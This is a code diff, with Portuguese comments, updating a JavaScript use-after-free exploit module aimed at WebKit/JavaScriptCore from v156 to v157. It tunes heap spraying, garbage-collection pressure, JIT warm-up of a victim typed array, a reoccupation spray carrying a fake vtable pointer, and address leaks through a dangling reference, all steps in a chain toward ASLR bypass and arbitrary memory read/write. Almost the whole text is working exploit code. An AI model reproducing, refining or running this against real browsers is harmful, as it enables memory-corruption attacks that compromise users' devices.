@@ -1,4 +1,4 @@
-// js/script3/testArrayArrayBufferVictimCrash.mjs (v156 - Refinamento do Spray UAF e Timing de Reocupação)
+// js/script3/testArrayBufferVictimCrash.mjs (v157 - Refinamento de Spray, Timing e Acesso Pós-UAF)
 
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
@@ -26,14 +26,14 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v156_OTIMIZADO_TIMING";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_REOCUPACAO_FOCO";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
 const LOCAL_SHORT_PAUSE = 100;
 const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
-const LOCAL_CRITICAL_PAUSE = 2000; // Mantido em 2000ms
+const LOCAL_CRITICAL_PAUSE = 2500; // Leve aumento para 2.5s
 
 let global_spray_objects = [];
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
@@ -238,12 +238,14 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
     if (aggressive) {
         try {
-            for (let k = 0; k < 3; k++) { // Reduzido ciclos para 3 para evitar OOM
+            for (let k = 0; k < 4; k++) { // Aumentar ciclos para 4
                 let temp_spray = [];
-                for (let i = 0; i < 2000; i++) { // Reduzido para 2000 iterações (1GB por ciclo)
-                    temp_spray.push(new ArrayBuffer(1024 * 512)); // Aloca 512KB
+                // Variar um pouco o tamanho dos buffers para introduzir mais fragmentação e forçar diferentes buckets
+                const sizes = [1024 * 512, 1024 * 256, 1024 * 128];
+                for (let i = 0; i < 2500; i++) { // Aumentar iterações por ciclo para maior pressão (aprox. 1GB/ciclo)
+                    temp_spray.push(new ArrayBuffer(sizes[i % sizes.length]));
                 }
-                temp_spray = null; // Torna elegível para GC
+                temp_spray = null;
                 await pauseFn(LOCAL_SHORT_PAUSE);
                 if (typeof gc === 'function') {
                     gc();
@@ -261,7 +263,7 @@ async function triggerGC(logFn, pauseFn, aggressive = true) {
         gc();
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
-    for (let i = 0; i < 200; i++) { // Reduzido para 200 vezes
+    for (let i = 0; i < 300; i++) { // Aumentar alocações pequenas
         new ArrayBuffer(1024);
     }
     await pauseFn(LOCAL_CRITICAL_PAUSE);
@@ -284,11 +286,11 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     dangling_ref = victim_object_arr;
 
-    // Aumentar iterações para forçar mais otimizações JIT na vítima.
-    for (let i = 0; i < 8000; i++) {
+    // Aumentar iterações e pausas para forçar mais otimizações JIT na vítima.
+    for (let i = 0; i < 10000; i++) { // Mais iterações
         victim_object_arr[0] += 0.000000000000001;
     }
-    await pauseFn(LOCAL_VERY_SHORT_PAUSE); // Pequena pausa para garantir otimização antes de liberar.
+    await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
 
     logFn(`[UAF] Objeto vítima (Float64Array, ${VICTIM_SIZE_BYTES} bytes) criado e referência pendurada simulada.`, "info");
@@ -304,7 +306,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
     logFn("--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (SPRAY AJUSTADO) ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 40000; // Aumentado para 40.000 para uma chance maior de reocupação
+    const SPRAY_COUNT_UAF_NEW = 50000; // Aumentado novamente para 50.000
 
     const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
     const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
@@ -318,8 +320,6 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
     const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);
     logFn(`[UAF] Valor Double do VTable da Structure para pulverização (assumindo tag e base): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
 
-    // **Estratégia ajustada para o spray de reocupação:**
-    // Criar um número massivo de Float64Arrays, todos do mesmo tamanho da vítima.
     for (let i = 0; i < SPRAY_COUNT_UAF_NEW; i++) {
         try {
             const view = new Float64Array(VICTIM_SIZE_DOUBLES);
@@ -329,8 +329,8 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
             }
             spray_arrays.push(view);
         } catch (e) {
-            logFn(`[UAF] ERRO durante alocação do spray (i=${i}): ${e.message}. Tentando continuar.`, "warn");
-            break; // Parar o spray se a alocação falhar consistentemente.
+            logFn(`[UAF] ERRO durante alocação do spray (i=${i}): ${e.message}. Parando spray.`, "warn");
+            break;
         }
     }
     hold_objects.push(spray_arrays);
@@ -342,7 +342,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v156_OTIMIZADO_TIMING";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v157_REOCUPACAO_FOCO";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
@@ -367,7 +367,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos OTIMIZADO) ---", "subtest");
         const sprayStartTime = performance.now();
-        const SPRAY_COUNT = 750000; // Mantido em 750.000
+        const SPRAY_COUNT = 1000000; // Mantido em 1.000.000 para estabilização
         logFn(`Iniciando spray de objetos (volume ${SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
         for (let i = 0; i < SPRAY_COUNT; i++) {
             const dataSize = 50 + (i % 50);
@@ -408,7 +408,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                  throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
             }
 
-            let attempts = 25; // Aumentado para 25 tentativas de leitura
+            let attempts = 30; // Aumentado para 30 tentativas de leitura
             for(let i = 0; i < attempts; i++) {
                 leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
                 if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0) {
